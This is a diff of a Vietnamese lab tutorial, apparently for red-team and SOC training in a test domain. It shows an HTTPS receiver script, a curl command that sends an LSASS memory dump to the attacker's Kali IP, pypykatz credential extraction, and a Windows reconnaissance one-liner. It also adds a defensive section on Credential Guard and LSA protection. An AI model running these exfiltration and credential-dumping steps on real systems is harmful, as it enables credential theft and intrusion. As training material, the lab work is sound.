@@ -239,7 +239,8 @@ Mở Terminal trên Kali và chạy lệnh sau để tạo chìa khóa mã hóa:
 2. **Tạo Script Python nhận file (****`https_receiver.py`****):**
 Tạo một file mới tên `https_receiver.py` trong thư mục `Downloads/loot` với nội dung sau:Python
 
-	`import http.server, ssl
+	```powershell
+	import http.server, ssl
 	
 	class SimpleHTTPRequestHandler(http.server.BaseHTTPRequestHandler):
 	    def do_POST(self):
@@ -255,7 +256,8 @@ Tạo một file mới tên `https_receiver.py` trong thư mục `Downloads/loot
 	httpd = http.server.HTTPServer(server_address, SimpleHTTPRequestHandler)
 	httpd.socket = ssl.wrap_socket(httpd.socket, certfile='./server.pem', server_side=True)
 	print("Trạm thu nhận HTTPS đang đợi tại cổng 443...")
-	httpd.serve_forever()`
+	httpd.serve_forever()
+	```
 
 3. **Chạy Server:**Bash
 
@@ -277,21 +279,14 @@ Tại giao diện **Caldera**, bạn hãy sử dụng Agent **Elevated** (`qgrhz
 PowerShell
 
 
-`$file = "$env:TEMP\lsass.dmp";
-$url = "https://192.168.253.128:443";
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
-Invoke-WebRequest -Uri $url -Method Post -InFile $file;`
-
-
-```c++
-if (Test-Path "C:\Users\jim\AppData\Local\Temp\lsass.dmp") {
-     curl.exe -X POST --data-binary "@C:\Users\jim\AppData\Local\Temp\lsass.dmp" https://192.168.253.128:443 -k
-} else {
-    Write-Host "File không tồn tại rồi sếp ơi!"
-}
+```powershell
+curl.exe -s -X POST --data-binary "@C:\Users\jim\AppData\Local\Temp\lsass.dmp" https://192.168.253.128:443 -k
 ```
 
 - **Dấu hiệu thành công:** Trên màn hình Kali sẽ hiện dòng `File uploaded successfully!`. Lúc này, file `lsass.dmp` đã nằm gọn trong thư mục `Downloads/loot` của bạn.
+
+![](./3557b0eb-61a4-80fd-b01d-ccc51592a484.3567b0eb-61a4-8027-9a25-fcb8d987b145.png)
+
 
 ### Giai đoạn 2: Offline Cracking (Phân tích trên Kali) {#3557b0eb61a48049b7cdddec8802e930}
 
@@ -300,82 +295,57 @@ File dump của Windows là một mớ hỗn độn các byte nhớ. Để tríc
 
 
 **Bước 1: Cài đặt công cụ (Nếu Kali chưa có)**
-Mở một tab Terminal mới và gõ lệnh:
-
-
-Bash
-
-
-`sudo apt update
-sudo apt install pypykatz`
-
-
-_(Nếu apt không tìm thấy, bạn có thể cài qua pip:_ _`pip3 install pypykatz`__)_
-
-
-**Bước 2: Bắt đầu "Mổ xẻ"**
-Đảm bảo bạn đang đứng ở thư mục `~/loot` (nơi chứa file lsass.dmp), chạy câu lệnh cực kỳ đơn giản này:
-
-
-Bash
 
 
 `pypykatz lsa minidump lsass.dmp`
 
 
-**Bước 3: Đọc kết quả**
+**Bước 2:** 
 Màn hình của bạn sẽ tuôn ra một "cơn mưa" text. Đừng hoảng! Hãy cuộn chuột lên từ từ và chú ý vào các block thông tin có cấu trúc như sau:
 
 
-Plaintext
+![](./3557b0eb-61a4-80fd-b01d-ccc51592a484.3567b0eb-61a4-80ec-9121-d9aa765a40c3.png)
 
 
-`== Logon Session ==
-Authentication Id : 0 ; 305886 (00000000:0004ab1e)
-Session Id        : 1
-Username          : jim
-Domain            : SOCLAB
-Logon Server      : SOCLAB-DC
-Logon Time        : 2026-05-03T12:00:00.000000
-SID               : S-1-5-21-...
-...
-    == MSV ==
-    Username: jim
-    Domain: SOCLAB
-    LM: aad3b435b51404eeaad3b435b51404ee
-    NT: 8846f7eaee8fb117ad06bdd830b7586c
-    SHA1: ...`
+ LSASS quản lý nhiều module xác thực khác nhau, gọi là các **SSP (Security Support Providers)**. WDigest và TSPKG là hai trong số các SSP đó:
+
+- **WDigest (Digest Authentication):** Được thiết kế để xác thực các ứng dụng Web (HTTP/SASL). Điểm yếu chết người của giao thức này là nó **bắt buộc phải giữ mật khẩu gốc dạng cleartext** trong RAM để tính toán ra mã băm MD5 mỗi khi có yêu cầu xác thực. Từ Windows 8.1 trở đi, Microsoft đã tắt mặc định tính năng này, nhưng hacker thường dùng một lệnh Registry nhỏ để bật lại nó nhằm "hứng" mật khẩu rõ.
+- **TSPKG (Terminal Services Package) / CredSSP:** Được sử dụng cho Remote Desktop (RDP). Để tính năng Đăng nhập một lần (Single Sign-On - SSO) của RDP hoạt động mượt mà, TSPKG cũng thường xuyên phải lưu lại mật khẩu rõ trong bộ nhớ.
+- **Kerberos: Gia hạn vé tự động (TGT Renewal):** Vé TGT của Kerberos thường có hạn sử dụng (mặc định là 10 tiếng). Khi vé này hết hạn, để tránh việc người dùng (ở đây là Administrator) cứ 10 tiếng lại phải gõ mật khẩu một lần, LSASS sẽ "tốt bụng" lưu lại luôn cái mật khẩu rõ `Password1!` vào vùng nhớ của Kerberos SSP. Khi cần, nó lôi mật khẩu đó ra để tự động xin vé TGT mới một cách âm thầm.
+	1. **Interactive Logon (Đăng nhập tương tác):** Khi `Administrator` gõ trực tiếp mật khẩu vào màn hình khóa hoặc qua RDP, mật khẩu đó được đẩy thẳng vào LSASS. Tùy thuộc vào phiên bản Windows (đặc biệt là các bản trước Windows 10 / Server 2016, hoặc chưa bật tính năng bảo vệ Credential Guard), chuỗi mật khẩu rõ này sẽ trôi nổi trong bộ nhớ rất lâu trước khi bị hệ thống dọn dẹp.
+
+### 🛡️ Góc nhìn Blue Team / CCD (Cách phòng thủ) {#3567b0eb61a480bf8c29ed97c0b40ed8}
 
 
-**Mục tiêu của bạn là tìm:**
+:::tip
 
-1. Tên **Username** (ví dụ: `jim`, `Administrator`, `cuong_nguyen`).
-2. Chuỗi **NT** (Đây chính là **NTLM Hash** - Chìa khóa vạn năng của Windows).
-3. Đôi khi ở phần `== Wdigest ==` hoặc `== TSPKG ==`, bạn còn có thể thấy nguyên mật khẩu chữ thường (Cleartext Password) hiện ra rành rành nếu hệ điều hành chưa được vá lỗi bảo mật Wdigest!
+Để ngăn chặn hoàn toàn việc rò rỉ này (khiến hacker dump LSASS chỉ ra toàn `None` hoặc Hash vô dụng), một SOC Engineer cần cấu hình máy tính:
+1. Bật **Credential Guard** (Sử dụng ảo hóa Virtualization-based Security để cô lập hoàn toàn tiến trình LSASS).
+
+2. Bật **LSA Protection (RunAsPPL)**: Ngăn không cho các tiến trình lạ (như `comsvcs.dll` hay Mimikatz) đọc bộ nhớ của LSASS.
+
+3. Vô hiệu hóa WDigest qua Registry (`UseLogonCredential = 0`).
+
+:::
+
+
+
 
 ---
 
 
-### Kịch bản tiếp theo (Giai đoạn 4) {#3557b0eb61a4802691dad1e5f2f5db44}
-
-
-Khi bạn đã copy được chuỗi NTLM Hash (ví dụ: `8846f7eaee8fb117ad06bdd830b7586c`) của một user có quyền cao (như Domain Admin), bạn **không cần phải cố gắng giải mã (crack) nó**.
-
-
-Bạn hãy sử dụng ngay kỹ thuật **Pass-The-Hash** bằng công cụ `evil-winrm` có sẵn trên Kali để nhảy thẳng sang máy tính khác (ví dụ máy chủ Domain Controller) bằng chính cái Hash đó:
-
-
-Bash
-
-
-`evil-winrm -i <IP_Máy_Đích> -u <Tên_User> -H <NTLM_Hash>`
-
-
-Đó là toàn bộ quy trình: Im lặng lấy file -&gt; Kéo về an toàn -&gt; Phân tích tại nhà -&gt; Lấy Hash đi đánh sập toàn bộ hệ thống! Bạn làm thử bước Exfiltration đi xem file có về đến Kali an toàn không nhé.
-
-
 # 7. Discovery {#3557b0eb61a480e4a02aea3cd65d9c35}
 
+
+```powershell
+whoami /all & systeminfo & ipconfig /all & netstat -ano & arp -a & tasklist /v & net localgroup administrators & net user & net group "Domain Admins" /domain & nltest /domain_trusts /all_trusts & sc query state= all
+```
+
+- `whoami /all`: Xem toàn bộ quyền hạn (SID/Privileges) của User hiện tại.
+- `systeminfo`: Lấy bản vá Windows, cấu hình phần cứng (Rất hay dùng để tìm lỗ hổng leo quyền).
+- `netstat -ano` & `arp -a`: Vẽ sơ đồ mạng, xem máy đang kết nối với ai.
+- `tasklist /v` & `sc query`: Quét xem có trình diệt virus (Defender, EDR) hay Splunk Forwarder đang chạy không.
+- `net group...` & `nltest...`: Thăm dò Active Directory, tìm đường sang Domain Controller.
 
 # 8. Lateral Movement {#3557b0eb61a4802c92a6fe78a06856fa}
 
